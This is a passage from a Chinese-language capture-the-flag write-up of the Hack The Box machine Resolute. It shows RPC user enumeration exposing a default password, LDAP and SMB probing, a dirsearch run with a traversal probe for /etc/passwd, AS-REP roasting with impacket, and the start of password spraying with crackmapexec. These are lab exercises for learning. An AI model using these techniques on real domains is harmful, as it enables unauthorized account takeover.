class="hljs-number">0</span>x19d6 acb: <span class="hljs-number">0</span>x00000010 Account: annette      Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10bd RID: <span class="hljs-number">0</span>x19d7 acb: <span class="hljs-number">0</span>x00000010 Account: annika       Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b9 RID: <span class="hljs-number">0</span>x19d3 acb: <span class="hljs-number">0</span>x00000010 Account: claire       Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10bf RID: <span class="hljs-number">0</span>x19d9 acb: <span class="hljs-number">0</span>x00000010 Account: claude       Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>xfbe RID: <span class="hljs-number">0</span>x1f7 acb: <span class="hljs-number">0</span>x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b5 RID: <span class="hljs-number">0</span>x19cf acb: <span class="hljs-number">0</span>x00000010 Account: felicia      Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b3 RID: <span class="hljs-number">0</span>x19cd acb: <span class="hljs-number">0</span>x00000010 Account: fred Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>xfbd RID: <span class="hljs-number">0</span>x1f5 acb: <span class="hljs-number">0</span>x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b6 RID: <span class="hljs-number">0</span>x19d0 acb: <span class="hljs-number">0</span>x00000010 Account: gustavo      Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>xff4 RID: <span class="hljs-number">0</span>x1f6 acb: <span class="hljs-number">0</span>x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b1 RID: <span class="hljs-number">0</span>x19cb acb: <span class="hljs-number">0</span>x00000010 Account: marcus       Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10a9 RID: <span class="hljs-number">0</span>x457 acb: <span class="hljs-number">0</span>x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10c0 RID: <span class="hljs-number">0</span>x2775 acb: <span class="hljs-number">0</span>x00000010 Account: melanie      Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10c3 RID: <span class="hljs-number">0</span>x2778 acb: <span class="hljs-number">0</span>x00000010 Account: naoki        Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10ba RID: <span class="hljs-number">0</span>x19d4 acb: <span class="hljs-number">0</span>x00000010 Account: paulo        Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10be RID: <span class="hljs-number">0</span>x19d8 acb: <span class="hljs-number">0</span>x00000010 Account: per  Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10a3 RID: <span class="hljs-number">0</span>x451 acb: <span class="hljs-number">0</span>x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b2 RID: <span class="hljs-number">0</span>x19cc acb: <span class="hljs-number">0</span>x00000010 Account: sally        Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10c2 RID: <span class="hljs-number">0</span>x2777 acb: <span class="hljs-number">0</span>x00000010 Account: simon        Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10bb RID: <span class="hljs-number">0</span>x19d5 acb: <span class="hljs-number">0</span>x00000010 Account: steve        Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b8 RID: <span class="hljs-number">0</span>x19d2 acb: <span class="hljs-number">0</span>x00000010 Account: stevie       Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10af RID: <span class="hljs-number">0</span>x19c9 acb: <span class="hljs-number">0</span>x00000010 Account: sunita       Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b7 RID: <span class="hljs-number">0</span>x19d1 acb: <span class="hljs-number">0</span>x00000010 Account: ulf  Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10c1 RID: <span class="hljs-number">0</span>x2776 acb: <span class="hljs-number">0</span>x00000010 Account: zach Name: (null)    Desc: (null)<br><span class="hljs-attribute">rpcclient</span> $&gt; <br></code></pre></td></tr></table></figure>

<p>为了阅读方便，我把重要的信息截了出来：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>: <span class="hljs-number">0x10a9</span> RID: <span class="hljs-number">0x457</span> acb: <span class="hljs-number">0x00000210</span> Account: marko <span class="hljs-type">Name</span>: Marko Novak       <span class="hljs-keyword">Desc</span>: Account created. <span class="hljs-keyword">Password</span> <span class="hljs-keyword">set</span> <span class="hljs-keyword">to</span> Welcome123!<br></code></pre></td></tr></table></figure>

<p>我尝试登录目标，不可以：</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs subunit">$ evil-winrm -i 10.10.10.169 -u marco -p &#x27;Welcome123!&#x27;                           <br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                                   <br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion<br><br>Info: Establishing connection to remote endpoint<br><br><br><span class="hljs-keyword">Error: </span>An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError<br><br><span class="hljs-keyword">Error: </span>Exiting with code 1<br></code></pre></td></tr></table></figure>

<h5 id="LDAP端口："><a href="#LDAP端口：" class="headerlink" title="LDAP端口："></a>LDAP端口：</h5><p>ldapsearch这工具虽然我还是不会用，但是我找到了个替补选项，Nmap有一些默认的LDAP脚本，LDAP查询返回的垃圾信息也很多，我只放部分与目标相关的，以满足下对LDAP的好奇心：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">$</span> <span class="hljs-string">sudo</span> <span class="hljs-string">nmap</span> <span class="hljs-string">-sT</span> <span class="hljs-string">-Pn</span> <span class="hljs-string">-n</span> <span class="hljs-string">--open</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> <span class="hljs-string">-p389</span> <span class="hljs-string">--script</span> <span class="hljs-string">ldap-rootdse</span><br><span class="hljs-string">Starting</span> <span class="hljs-string">Nmap</span> <span class="hljs-number">7.92</span> <span class="hljs-string">(</span> <span class="hljs-string">https://nmap.org</span> <span class="hljs-string">)</span> <span class="hljs-string">at</span> <span class="hljs-number">2022-04-23 </span><span class="hljs-number">17</span><span class="hljs-string">:56</span> <span class="hljs-string">CST</span><br><span class="hljs-string">Nmap</span> <span class="hljs-string">scan</span> <span class="hljs-string">report</span> <span class="hljs-string">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span><br><span class="hljs-string">Host</span> <span class="hljs-string">is</span> <span class="hljs-string">up</span> <span class="hljs-string">(0.17s</span> <span class="hljs-string">latency).</span><br><br><span class="hljs-string">PORT</span>    <span class="hljs-string">STATE</span> <span class="hljs-string">SERVICE</span><br><span class="hljs-number">389</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span><br><span class="hljs-string">|</span> <span class="hljs-attr">ldap-rootdse:</span> <br><span class="hljs-string">|</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">Results</span><br><span class="hljs-string">|</span>   <span class="hljs-string">&lt;ROOT&gt;</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">currentTime:</span> <span class="hljs-number">20220423100354.</span><span class="hljs-string">0Z</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">subschemaSubentry:</span> <span class="hljs-string">CN=Aggregate,CN=Schema,CN=Configuration,DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">dsServiceName:</span> <span class="hljs-string">CN=NTDS</span> <span class="hljs-string">Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">namingContexts:</span> <span class="hljs-string">DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">namingContexts:</span> <span class="hljs-string">CN=Configuration,DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">namingContexts:</span> <span class="hljs-string">CN=Schema,CN=Configuration,DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">namingContexts:</span> <span class="hljs-string">DC=DomainDnsZones,DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">namingContexts:</span> <span class="hljs-string">DC=ForestDnsZones,DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">defaultNamingContext:</span> <span class="hljs-string">DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">schemaNamingContext:</span> <span class="hljs-string">CN=Schema,CN=Configuration,DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">configurationNamingContext:</span> <span class="hljs-string">CN=Configuration,DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">rootDomainNamingContext:</span> <span class="hljs-string">DC=megabank,DC=local</span><br><span class="hljs-string">......</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPVersion:</span> <span class="hljs-number">3</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPVersion:</span> <span class="hljs-number">2</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxPoolThreads</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxPercentDirSyncRequests</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxDatagramRecv</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxReceiveBuffer</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">InitRecvTimeout</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxConnections</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxConnIdleTime</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxPageSize</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxBatchReturnMessages</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxQueryDuration</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxDirSyncDuration</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxTempTableSize</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxResultSetSize</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MinResultSets</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxResultSetsPerConn</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxNotificationPerConn</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxValRange</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxValRangeTransitive</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">ThreadMemoryLimit</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">SystemMemoryLimitPercent</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">highestCommittedUSN:</span> <span class="hljs-number">151908</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedSASLMechanisms:</span> <span class="hljs-string">GSSAPI</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedSASLMechanisms:</span> <span class="hljs-string">GSS-SPNEGO</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedSASLMechanisms:</span> <span class="hljs-string">EXTERNAL</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedSASLMechanisms:</span> <span class="hljs-string">DIGEST-MD5</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">dnsHostName:</span> <span class="hljs-string">Resolute.megabank.local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">ldapServiceName:</span> <span class="hljs-string">megabank.local:resolute$@MEGABANK.LOCAL</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">serverName:</span> <span class="hljs-string">CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local</span><br><span class="hljs-string">......</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">isSynchronized:</span> <span class="hljs-literal">TRUE</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">isGlobalCatalogReady:</span> <span class="hljs-literal">TRUE</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">domainFunctionality:</span> <span class="hljs-number">7</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">forestFunctionality:</span> <span class="hljs-number">7</span><br><span class="hljs-string">|_</span>      <span class="hljs-attr">domainControllerFunctionality:</span> <span class="hljs-number">7</span><br><span class="hljs-attr">Service Info: Host:</span> <span class="hljs-string">RESOLUTE;</span> <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows</span><br><br><span class="hljs-attr">Nmap done:</span> <span class="hljs-number">1</span> <span class="hljs-string">IP</span> <span class="hljs-string">address</span> <span class="hljs-string">(1</span> <span class="hljs-string">host</span> <span class="hljs-string">up)</span> <span class="hljs-string">scanned</span> <span class="hljs-string">in</span> <span class="hljs-number">2.12</span> <span class="hljs-string">seconds</span><br></code></pre></td></tr></table></figure>

<p>它似乎是有一个子域：</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">resolute$<span class="hljs-symbol">@MEGABANK</span>.<span class="hljs-keyword">LOCAL</span><br></code></pre></td></tr></table></figure>

<h5 id="SMB端口："><a href="#SMB端口：" class="headerlink" title="SMB端口："></a>SMB端口：</h5><p>遗憾的是，目标不允许匿名访问共享：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ smbclient -N -L \\<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span><br>Anonymous <span class="hljs-keyword">login</span> successful<br><br>        Sharename       <span class="hljs-keyword">Type</span>      <span class="hljs-keyword">Comment</span><br>        <span class="hljs-comment">---------       ----      -------</span><br>Reconnecting <span class="hljs-keyword">with</span> SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br>do_connect: <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">to</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">connect</span> <span class="hljs-keyword">with</span> SMB1 <span class="hljs-comment">-- no workgroup available</span><br></code></pre></td></tr></table></figure>

<p>或许我可以试试通过RPC得到的口令：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ crackmapexec smb <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> -u marco -p <span class="hljs-string">&#x27;Welcome123!&#x27;</span> <span class="hljs-comment">--continue-on-success</span><br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span>    <span class="hljs-number">445</span>    RESOLUTE         [*] Windows <span class="hljs-keyword">Server</span> <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span> x64 (<span class="hljs-type">name</span>:RESOLUTE) (<span class="hljs-keyword">domain</span>:megabank.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">True</span>)<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span>    <span class="hljs-number">445</span>    RESOLUTE         [-] megabank.<span class="hljs-keyword">local</span>\marco:Welcome123! STATUS_LOGON_FAILURE<br></code></pre></td></tr></table></figure>

<p>它也不可以。其他端口我觉得我没必要写，因为它没什么内容，尤其是两个http服务端口，都是not found。即使强行爆破一下，也是什么都没有的：</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs subunit">$ dirsearch -u http://10.10.10.169:5985/<br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                     <br> (_||| _) (/_(_|| (_| )                                                                                                              <br>                                                                                                                                     <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/worldisend/.dirsearch/reports/10.10.10.169<span class="hljs-string">-5985</span>/-_22<span class="hljs-string">-04</span><span class="hljs-string">-23</span>_17<span class="hljs-string">-51</span><span class="hljs-string">-44</span>.txt<br><br><span class="hljs-keyword">Error </span>Log: /home/worldisend/.dirsearch/logs/errors<span class="hljs-string">-22</span><span class="hljs-string">-04</span><span class="hljs-string">-23</span>_17<span class="hljs-string">-51</span><span class="hljs-string">-44</span>.log<br><br>Target: http://10.10.10.169:5985/<br><br>[17:51:45] Starting: <br>[17:51:51] 403 -  312B  - /%2e%2e//google.com                              <br>[17:52:25] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           <br>[17:54:23] 405 -    0B  - /wsman                                            <br>                                                                             <br>Task Completed  <br></code></pre></td></tr></table></figure>

<h5 id="kerberos端口："><a href="#kerberos端口：" class="headerlink" title="kerberos端口："></a>kerberos端口：</h5><p>我可以将从RPC枚举到的用户名提取做成一本字典，这里不需要枚举了，因为RPC本身就是从目标机器中查询出来的用户，这些用户本就是存在的。</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Administrator</span><br><span class="hljs-attribute">Guest</span><br><span class="hljs-attribute">krbtgt</span><br><span class="hljs-attribute">DefaultAccount</span><br><span class="hljs-attribute">ryan</span><br><span class="hljs-attribute">marko</span><br><span class="hljs-attribute">sunita</span><br><span class="hljs-attribute">abigail</span><br><span class="hljs-attribute">marcus</span><br><span class="hljs-attribute">sally</span><br><span class="hljs-attribute">fred</span><br><span class="hljs-attribute">angela</span><br><span class="hljs-attribute">felicia</span><br><span class="hljs-attribute">gustavo</span><br><span class="hljs-attribute">ulf</span><br><span class="hljs-attribute">stevie</span><br><span class="hljs-attribute">claire</span><br><span class="hljs-attribute">paulo</span><br><span class="hljs-attribute">steve</span><br><span class="hljs-attribute">annette</span><br><span class="hljs-attribute">annika</span><br><span class="hljs-attribute">per</span><br><span class="hljs-attribute">claude</span><br><span class="hljs-attribute">melanie</span><br><span class="hljs-attribute">zach</span><br><span class="hljs-attribute">simon</span><br><span class="hljs-attribute">naoki</span><br></code></pre></td></tr></table></figure>

<p>我试着去枚举目标中保存有AS-REP的哈希：</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">$ ../toolbox/impacket-<span class="hljs-number">0.9</span>.<span class="hljs-number">24</span>/examples/GetNPUsers.py &#x27;MEGABANK.LOCAL/&#x27; -usersfile ./users.txt -format hashcat -outputfile hashes.txt -dc-ip <span class="hljs-number">10.10</span>.<span class="hljs-number">10.169</span><br>Impacket v0.<span class="hljs-number">9.24</span> - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation<br><br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">Administrator</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)<br>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)<br>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">ryan</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">marko</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">sunita</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">abigail</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">marcus</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">sally</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">fred</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">angela</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">felicia</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">gustavo</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">ulf</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">stevie</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">claire</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">paulo</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">steve</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">annette</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">annika</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">per</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">claude</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">melanie</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">zach</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">simon</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">naoki</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br></code></pre></td></tr></table></figure>

<p>但是我失败了，一条哈希都没有。没想到这次我竟然这么快就进入了死胡同，因为我现在只有一堆用户名和一个口令。</p>
<h5 id="密码喷涂："><a href="#密码喷涂：" class="headerlink" title="密码喷涂："></a>密码喷涂：</h5><p>还是我局限了在目标机器中有个标签”<strong>Password Spraying</strong>“，即密码喷涂的意思，它类似于暴力破解，但不同的是，密码喷涂是拥有口令之后，对不同的用户名进行枚举猜解，从而获取完整的合法账户凭证，我可以借助SMB共享来间接的确定这一点，信息也有很多，我会截出关键的，因为它实在太明显了：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ crackmapexec smb <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> -u ./users.txt -p <span class="hljs-string">&#x27;Welcome123!&#x27;</span> <span class="hljs-comment">--continue-on-success</span><br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span>    <span class="hljs-number">445</span>    RESOLUTE         [*] Windows <span class="hljs-keyword">Server</span> <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span> x64 (<span class="hljs-type">name</span>:RESOLUTE) (<span class="hljs-keyword">domain</span>:megabank.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">True</span>)<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span 